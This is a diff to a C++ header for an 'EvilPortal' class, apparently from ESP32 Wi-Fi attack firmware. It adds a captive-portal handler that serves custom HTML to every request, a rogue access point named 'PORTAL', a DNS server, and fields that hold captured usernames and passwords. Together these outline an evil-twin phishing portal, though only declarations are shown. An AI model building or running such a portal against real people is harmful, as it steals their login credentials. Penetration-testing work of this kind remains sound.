@@ -7,10 +7,8 @@
 
 #include "configs.h"
 #include "settings.h"
-#include "WiFiScan.h"
 
 extern Settings settings_obj;
-extern WiFiScan wifi_scan_obj;
 
 #define WAITING 0
 #define GOOD 1
@@ -23,18 +21,38 @@ extern WiFiScan wifi_scan_obj;
 #define ACK_CMD "ack"
 #define MAX_HTML_SIZE 20000
 
+class CaptiveRequestHandler : public AsyncWebHandler {
+public:
+  CaptiveRequestHandler() {}
+  virtual ~CaptiveRequestHandler() {}
+
+  bool canHandle(AsyncWebServerRequest *request) { return true; }
+
+  void handleRequest(AsyncWebServerRequest *request, char * index_html) {
+    request->send_P(200, "text/html", index_html);
+  }
+};
+
 class EvilPortal {
 
   private:
     bool runServer;
     bool name_received;
     bool password_received;
+
     String user_name;
     String password;
 
-    //DNSServer dnsServer;
-    //AsyncWebServer server(80);
+    char apName[30] = "PORTAL";
+    char index_html[MAX_HTML_SIZE] = "TEST";
 
+    DNSServer dnsServer;
+
+    void (*resetFunction)(void) = 0;
+
+    bool checkForCommand(char *command);
+    void getInitInput();
+    void setupServer();
     void startPortal();
     void startAP();
 
@@ -43,6 +61,8 @@ class EvilPortal {
 
     String get_user_name();
     String get_password();
+    void begin();
+    void main();
 
 };
 
